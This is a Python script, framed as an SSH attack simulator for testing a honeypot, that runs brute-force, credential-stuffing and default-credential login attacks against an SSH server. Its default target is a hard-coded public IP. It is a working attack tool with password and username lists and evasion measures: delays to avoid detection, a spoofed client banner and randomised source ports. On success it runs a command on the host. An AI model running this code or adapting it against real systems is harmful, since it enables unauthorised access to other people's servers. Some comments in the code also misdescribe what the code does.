"""
SSH Attack Simulator for Honeypot
Simulates SSH brute force and credential stuffing attacks
"""
import paramiko
import socket
import time
import random
import logging
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timedelta
import ipaddress

# Configure logging with Windows compatibility
class NoEmojiStreamHandler(logging.StreamHandler):
    def emit(self, record):
        # Remove emojis from the message
        if hasattr(record, 'msg'):
            import re
            record.msg = re.sub(r'[\U0001F300-\U0001F9FF]', '', str(record.msg))
        super().emit(record)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('ssh_attack_simulator.log', encoding='utf-8'),
        NoEmojiStreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class SSHAttackSimulator:
    def __init__(self, target_ip, port=22, max_workers=3):
        """
        Initialize the SSH attack simulator
        :param target_ip: Target IP address
        :param port: SSH port (default: 22)
        :param max_workers: Maximum number of concurrent attack threads (reduced to 3)
        """
        self.target_ip = target_ip
        self.port = port
        self.max_workers = max_workers
        
        # Common usernames and passwords for brute force
        self.common_usernames = [
            'root', 'admin', 'ubuntu', 'ec2-user', 'oracle', 'user', 'test',
            'pi', 'debian', 'centos', 'fedora', 'nagios', 'vagrant', 'azureuser'
        ]
        
        self.common_passwords = [
            '', '123456', 'password', 'admin', '12345678', 'qwerty', '123456789',
            '12345', '1234', '1234567', '1234567890', 'ubuntu', 'oracle', 'welcome',
            'letmein', 'master', 'root', 'admin123', 'passw0rd', 'test', '123123',
            'qwerty123', '1q2w3e4r', '1qaz2wsx', 'qazwsx', 'password1', 'root123',
            'toor', 'admin@123', 'admin1234', 'administrator', 'changeme', '123qwe',
            'qwe123', 'qweasdzxc', 'qweasd', 'iloveyou', 'monkey', 'sunshine', 'shadow',
            'superuser', 'default', 'system', 'manager', 'webadmin', 'operator', 'guest'
        ]
        
        # Generate attacker IPs
        self.attacker_ips = self._generate_attacker_ips(50)
        
        # Track metrics
        self.metrics = {
            'total_attempts': 0,
            'successful_logins': 0,
            'failed_logins': 0,
            'blocked_ips': set(),
            'start_time': datetime.now().isoformat(),
            'attack_types': {
                'bruteforce': 0,
                'credential_stuffing': 0,
                'default_credentials': 0
            }
        }
    
    def _generate_attacker_ips(self, count):
        """Generate a list of attacker IP addresses"""
        # On Windows, we'll just use the local IP and some random IPs
        # since we can't bind to arbitrary IPs
        local_ip = socket.gethostbyname(socket.gethostname())
        return [local_ip] * count
        
        # The following code is kept for reference but not used on Windows
        networks = [
            '5.188.0.0/16',    # Known scanner range
            '45.227.253.0/24',  # Known malicious IP range
            '185.142.236.0/24', # Another scanner range
            '192.168.0.0/16',   # Internal network
            '10.0.0.0/8'        # Another internal range
        ]
        
        ips = []
        for net in networks:
            network = ipaddress.IPv4Network(net, strict=False)
            for _ in range(count // len(networks)):
                ips.append(str(network[random.randint(0, network.num_addresses - 1)]))
        
        return ips
    
    def _get_random_attacker_ip(self):
        """Get a random attacker IP"""
        return random.choice(self.attacker_ips)
    
    def _try_ssh_login(self, username, password, attacker_ip):
        """Attempt SSH login with given credentials"""
        # Add random delay to avoid detection
        time.sleep(random.uniform(1.0, 3.0))
        
        client = paramiko.SSHClient()
        # Use more lenient host key policy
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        # Set a more aggressive timeout
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.set_log_channel('paramiko.transport')
        
        try:
            # Create socket with more conservative timeouts
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(15)  # Increased timeout to 15 seconds
            
            # Use TCP keepalive
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 0)  # Disable Nagle's algorithm
            
            # Add source port randomization
            sock.bind(('', random.randint(32768, 61000)))
            
            # Connect with a reasonable timeout
            sock.connect((self.target_ip, self.port))
            
            # Configure transport with more conservative timeouts
            transport = paramiko.Transport(sock)
            transport.banner_timeout = 20
            transport.handshake_timeout = 20
            transport.auth_timeout = 15
            
            # Add some random delays to appear more human-like
            time.sleep(random.uniform(0.5, 1.5))
            
            # Use a common SSH client version
            transport.local_version = 'SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3'
            
            try:
                # Try to authenticate
                transport.connect(username=username, password=password)
                
                # If we get here, authentication was successful
                logger.info(f"[SUCCESS] Login - {username}:{password} from {attacker_ip}")
                self.metrics['successful_logins'] += 1
                
                # Get the SSH session
                channel = transport.open_session()
                channel.settimeout(5)
                
                # Try to execute a simple command to verify the session
                channel.exec_command('whoami')
                
                # Close the channel and transport properly
                if channel.exit_status_ready():
                    channel.recv_exit_status()
                channel.close()
                
                return True
                
            except paramiko.AuthenticationException as e:
                # This is expected for failed login attempts
                logger.debug(f"[FAILED] Login - {username}:{password} from {attacker_ip}")
                self.metrics['failed_logins'] += 1
                return False
                
            except paramiko.SSHException as e:
                # Handle SSH-specific exceptions
                logger.warning(f"[SSH ERROR] {username}:{password} from {attacker_ip} - {str(e)}")
                if "Error reading SSH protocol banner" in str(e):
                    logger.debug("Server might be rate limiting connections")
                return False
                
            except Exception as e:
                # Handle other exceptions
                error_msg = str(e)
                logger.warning(f"[ERROR] {username}:{password} from {attacker_ip} - {error_msg}")
                
                # Check for common blocking patterns
                if any(msg in error_msg for msg in ["Connection reset by peer", 
                                                  "No route to host", 
                                                  "Connection timed out", 
                                                  "Network is unreachable"]):
                    self.metrics['blocked_ips'].add(attacker_ip)
                return False
                
            finally:
                try:
                    if transport.is_active():
                        transport.close()
                except:
                    pass
        except Exception as e:
            logger.error(f"Connection failed: {str(e)}")
            return False
        finally:
            client.close()
    
    def _brute_force_attack(self, username, max_attempts=10):
        """Brute force attack with common passwords"""
        attacker_ip = self._get_random_attacker_ip()
        attempts = 0
        
        for password in self.common_passwords:
            if attempts >= max_attempts:
                break
                
            self.metrics['total_attempts'] += 1
            self.metrics['attack_types']['bruteforce'] += 1
            
            if self._try_ssh_login(username, password, attacker_ip):
                return True
                
            attempts += 1
            time.sleep(random.uniform(0.5, 2.0))  # Random delay between attempts
            
            # Sometimes switch to a different IP
            if random.random() < 0.3:  # 30% chance to switch IP
                attacker_ip = self._get_random_attacker_ip()
        
        return False
    
    def _credential_stuffing(self, username_password_pairs):
        """Try multiple username/password combinations"""
        attacker_ip = self._get_random_attacker_ip()
        
        for username, password in username_password_pairs:
            self.metrics['total_attempts'] += 1
            self.metrics['attack_types']['credential_stuffing'] += 1
            
            if self._try_ssh_login(username, password, attacker_ip):
                return True
                
            time.sleep(random.uniform(0.2, 1.0))
            
            # Sometimes switch to a different IP
            if random.random() < 0.2:  # 20% chance to switch IP
                attacker_ip = self._get_random_attacker_ip()
        
        return False
    
    def _default_credentials_attack(self):
        """Try common default credentials"""
        defaults = [
            ('root', 'root'),
            ('admin', 'admin'),
            ('ubuntu', 'ubuntu'),
            ('oracle', 'oracle'),
            ('pi', 'raspberry'),
            ('vagrant', 'vagrant')
        ]
        
        return self._credential_stuffing(defaults)
    
    def run_attack(self, duration_minutes=10):
        """Run the SSH attack simulation"""
        logger.info(f"Starting SSH attack simulation for {duration_minutes} minutes...")
        logger.info(f"Target: {self.target_ip}:{self.port}")
        logger.info(f"Max concurrent workers: {self.max_workers}")
        logger.info("Using slower, more stealthy approach to avoid detection")
        
        # Calculate end time with some buffer
        end_time = datetime.now() + timedelta(minutes=duration_minutes)
        
        # Track connection attempts per IP to avoid flooding
        self.ip_attempts = {}
        
        # Track last success time to detect rate limiting
        self.last_success_time = datetime.now()
        
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = []
            
            while datetime.now() < end_time:
                # Add more random delays between attacks (3-10 seconds)
                delay = random.uniform(3.0, 10.0)
                logger.debug(f"Sleeping for {delay:.2f} seconds...")
                time.sleep(delay)
                
                # Choose attack type with adjusted weights based on success rate
                attack_types = ['bruteforce', 'credential_stuffing', 'default_credentials']
                weights = [0.5, 0.3, 0.2]
                
                # If we've had many failures, increase default credentials weight
                if self.metrics['failed_logins'] > 20 and self.metrics['successful_logins'] == 0:
                    weights = [0.3, 0.2, 0.5]  # Favor default credentials
                
                attack_type = random.choices(attack_types, weights=weights)[0]
                
                if attack_type == 'bruteforce':
                    username = random.choice(self.common_usernames)
                    futures.append(executor.submit(self._brute_force_attack, username))
                elif attack_type == 'credential_stuffing':
                    # Generate some random username/password pairs
                    pairs = [(random.choice(self.common_usernames), 
                             random.choice(self.common_passwords)) 
                            for _ in range(random.randint(3, 10))]
                    futures.append(executor.submit(self._credential_stuffing, pairs))
                else:  # default_credentials
                    futures.append(executor.submit(self._default_credentials_attack))
                
                # Random delay between attack starts
                time.sleep(random.uniform(0.1, 0.5))
                
                # Log progress with more detailed information
                if self.metrics['total_attempts'] % 5 == 0 and self.metrics['total_attempts'] > 0:
                    success_rate = (self.metrics['successful_logins'] / self.metrics['total_attempts'] * 100) if self.metrics['total_attempts'] > 0 else 0
                    logger.info(
                        f"Attempts: {self.metrics['total_attempts']} | "
                        f"Success: {self.metrics['successful_logins']} ({success_rate:.1f}%) | "
                        f"Failed: {self.metrics['failed_logins']} | "
                        f"Blocked IPs: {len(self.metrics['blocked_ips'])} | "
                        f"Active workers: {len([f for f in futures if not f.done()])}"
                    )
                    
                    # If we're getting many timeouts, slow down
                    if self.metrics['failed_logins'] > 0 and (self.metrics['failed_logins'] / self.metrics['total_attempts']) > 0.8:
                        logger.warning("High failure rate detected. Slowing down...")
                        time.sleep(2)  # Add extra delay
        
        # Wait for all attacks to complete
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                logger.error(f"Error in attack: {e}")
        
        self._generate_report()
    
    def _generate_report(self):
        """Generate a summary report of the attack simulation"""
        duration = datetime.now() - datetime.fromisoformat(self.metrics['start_time'])
        
        report = f"""
=== SSH Attack Simulation Report ===
Summary:
  - Target: {target}:{port}
  - Duration: {duration}
  - Total Attempts: {total_attempts}
  - Successful Logins: {successful_logins}
  - Failed Logins: {failed_logins}
  - Blocked IPs: {blocked_ips}
  - Success Rate: {success_rate:.1f}%

Attack Types:
{attack_types}

Blocked IPs:
{blocked_ips_list}
"""
        # Calculate success rate (avoid division by zero)
        success_rate = (self.metrics['successful_logins'] / self.metrics['total_attempts'] * 100) if self.metrics['total_attempts'] > 0 else 0
        
        # Format attack types
        attack_types = '\n'.join([f"  - {k}: {v}" for k, v in self.metrics['attack_types'].items()])
        
        # Format blocked IPs
        blocked_ips_list = '\n'.join([f"  - {ip}" for ip in self.metrics['blocked_ips']]) or "  None"
        
        report = report.format(
            target=self.target_ip,
            port=self.port,
            duration=str(duration).split('.')[0],  # Remove microseconds
            total_attempts=self.metrics['total_attempts'],
            successful_logins=self.metrics['successful_logins'],
            failed_logins=self.metrics['failed_logins'],
            blocked_ips=len(self.metrics['blocked_ips']),
            success_rate=success_rate,
            attack_types=attack_types,
            blocked_ips_list=blocked_ips_list
        )
        
        logger.info("\n" + "="*50)
        logger.info(report)
        logger.info("="*50)
        
        # Save report to file
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f'ssh_attack_report_{timestamp}.txt'
        
        with open(filename, 'w') as f:
            f.write(report)
        
        logger.info(f"Report saved to {filename}")


def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='SSH Attack Simulator for Honeypot')
    parser.add_argument('--target', type=str, default='129.154.41.111',
                       help='Target IP address (default: 129.154.41.111)')
    parser.add_argument('--port', type=int, default=22,
                       help='SSH port (default: 22)')
    parser.add_argument('--duration', type=int, default=10,
                       help='Duration of simulation in minutes (default: 10)')
    parser.add_argument('--workers', type=int, default=10,
                       help='Maximum number of concurrent workers (default: 10)')
    parser.add_argument('--debug', action='store_true',
                       help='Enable debug logging')
    
    args = parser.parse_args()
    
    if args.debug:
        logger.setLevel(logging.DEBUG)
    
    simulator = SSHAttackSimulator(
        target_ip=args.target,
        port=args.port,
        max_workers=args.workers
    )
    
    try:
        simulator.run_attack(duration_minutes=args.duration)
    except KeyboardInterrupt:
        logger.info("\nAttack simulation interrupted. Generating report...")
        simulator._generate_report()


if __name__ == '__main__':
    main()
